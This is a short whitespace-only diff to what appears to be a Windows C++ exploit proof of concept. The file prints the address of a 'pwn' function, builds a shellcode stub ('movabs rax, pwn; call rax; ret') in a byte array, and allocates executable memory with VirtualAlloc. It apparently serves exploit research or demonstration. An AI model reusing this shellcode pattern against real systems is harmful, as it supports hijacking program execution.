@@ -50,11 +50,11 @@ int main()
 		std::cout << "Exploit at: 0x" << std::hex << (uintptr_t)pwn << std::endl;
 
 		unsigned char exploit[] = {
-			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// pointer to shellcode start
-			//0xCC,														// breakpoint
-			0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// movabs rax, pwn
-			0xFF, 0xD0,													// call rax
-			0xC3,														// ret
+			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // pointer to shellcode start
+			//0xCC,                                                     // breakpoint
+			0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, pwn
+			0xFF, 0xD0,                                                 // call rax
+			0xC3,                                                       // ret
 		};
 
 		unsigned char* buffer = (unsigned char*)VirtualAlloc(NULL, sizeof(exploit), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
